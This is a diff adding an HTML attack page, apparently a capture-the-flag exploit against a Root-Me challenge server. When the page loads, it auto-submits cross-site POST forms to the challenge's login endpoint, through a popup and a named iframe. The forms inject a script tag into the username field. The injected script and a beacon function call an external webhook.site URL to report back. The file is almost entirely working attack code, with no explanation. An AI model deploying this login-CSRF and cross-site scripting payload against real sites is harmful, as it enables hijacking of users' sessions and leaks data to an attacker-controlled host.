@@ -1,0 +1,32 @@
+<!doctype html><html><head><meta charset="utf-8"><title>v7</title></head><body>
+<iframe name="fr" style="width:400px;height:300px"></iframe>
+<script>
+var CH='http://challenge01.root-me.org:58003';
+var U='https://webhook.site/af9addd2-9c27-4b22-aad4-0001211f0c67';
+function b(k,v){try{fetch(U+'?'+k+'='+encodeURIComponent(String(v==null?'1':v)).slice(0,150));}catch(e){}}
+function mk(via){return '<script>fetch(\'https://webhook.site/af9addd2-9c27-4b22-aad4-0001211f0c67?via='+via+'\')<\/script>';}
+b('w1');
+var p1=window.open(CH+'/profile','pop1');
+b('pop1',p1?'ok':'null');
+setTimeout(function(){
+  // canal A : popup pop2
+  var p2=window.open('','pop2');
+  b('pop2',p2?'ok':'null');
+  var f2=document.createElement('form');
+  f2.method='POST';f2.action=CH+'/login';f2.target='pop2';
+  var u2=document.createElement('input');u2.name='username';u2.value=mk('pop2');
+  var s2=document.createElement('input');s2.name='secret';s2.value='xa';
+  f2.appendChild(u2);f2.appendChild(s2);document.body.appendChild(f2);f2.submit();
+  // canal B : iframe nommee
+  var f1=document.createElement('form');
+  f1.method='POST';f1.action=CH+'/login';f1.target='fr';
+  var u1=document.createElement('input');u1.name='username';u1.value=mk('iframe');
+  var s1=document.createElement('input');s1.name='secret';s1.value='xb';
+  f1.appendChild(u1);f1.appendChild(s1);document.body.appendChild(f1);f1.submit();
+  b('posted','1');
+  setTimeout(function(){b('t1','1');},1000);
+  setTimeout(function(){b('t3','1');},3000);
+  setTimeout(function(){b('t5','1');},5000);
+},700);
+</script>
+</body></html>
